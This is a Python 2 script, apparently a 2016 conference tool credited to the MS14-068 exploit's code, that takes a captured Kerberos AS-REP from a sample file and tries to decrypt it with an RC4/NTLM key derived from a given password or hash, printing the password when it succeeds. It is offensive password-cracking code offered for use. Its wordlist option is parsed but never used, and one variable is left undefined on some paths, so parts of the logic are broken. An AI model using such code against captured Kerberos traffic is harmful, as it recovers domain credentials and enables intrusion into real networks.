#!/usr/bin/python

# Author
# ------
# Geoffrey Janjua
# Contact : geoffrey.janjua at exumbraops dot com
# Shamelessly stolen from the MS14-068 exploit by Sylvian Monne
#
# Thank you to:
# Tim Medin (Counter Hack)
# Sean Metcalf (AD Security)
# Sylvian Monne (BiDOrD)
# Benjamin Delpy (gentilkiwi)
# Alberto Solino (core security)

# 27 May 2016
# Kerberos Party Tricks (mad beta edition)
# LayerOne 2016 

# Tool to crack Kerberos AS-REQs

import sys, os, binascii
from random import getrandbits
from time import time, localtime, strftime

from kek.ccache import CCache, get_tgt_cred, kdc_rep2ccache
from kek.crypto import generate_subkey, ntlm_hash, RC4_HMAC, HMAC_MD5
from kek.krb5 import build_as_req, build_tgs_req, send_req, recv_rep, \
    decrypt_as_rep, decrypt_tgs_rep, decrypt_ticket_enc_part, iter_authorization_data, \
    AD_WIN2K_PAC
from kek.pac import build_pac, pretty_print_pac
from kek.util import epoch2gt, gt2epoch


def crack(user_key, wordlist, plaintext_password):

    pkt = [f.rstrip('\n') for f in open('samples/test4.txt')]
    data = binascii.a2b_hex(pkt[0]) 
#    print pkt[0]
    sys.stderr.write('  [+] Parsing AS-REP')
    sys.stderr.flush()
    try:
        as_rep, as_rep_enc = decrypt_as_rep(data, user_key)
        session_key = (int(as_rep_enc['key']['keytype']), str(as_rep_enc['key']['keyvalue']))
        logon_time = gt2epoch(str(as_rep_enc['authtime']))
        tgt_a = as_rep['ticket']
        sys.stderr.write(' Done!\n')
        sys.stderr.write('  [+] Cracked with password(RC4) %s(%s)\n' % (plaintext_password,binascii.b2a_hex(user_key[1])))
    except Exception as e:
        print ' ERROR:', e

if __name__ == '__main__':
    from getopt import getopt
    from getpass import getpass

    def usage_and_exit():
        print >> sys.stderr, 'USAGE:'
        print >> sys.stderr, '%s' % sys.argv[0]
        print >> sys.stderr, ''
        print >> sys.stderr, 'OPTIONS:'
        print >> sys.stderr, '    -w <dictionary file>'
        print >> sys.stderr, '    -p <clearPassword>'
        print >> sys.stderr, ' --rc4 <ntlmHash>'
        sys.exit(1)

    opts, args = getopt(sys.argv[1:], 'w:p:', ['rc4='])
    opts = dict(opts)
    if not all(k in opts for k in (['-p'])):
        usage_and_exit()
    wordlist = None

    if '--rc4' in opts:
        user_key = (RC4_HMAC, opts['--rc4'].decode('hex'))
        assert len(user_key[1]) == 16
    elif '-p' in opts:
        user_key = (RC4_HMAC, ntlm_hash(opts['-p']).digest())
        plaintext_password = opts['-p']
    elif '-w' in opts:
        wordlist = opts['-w']
    else:
        user_key = (RC4_HMAC, ntlm_hash(getpass('Password: ')).digest())

    crack(user_key, wordlist, plaintext_password)
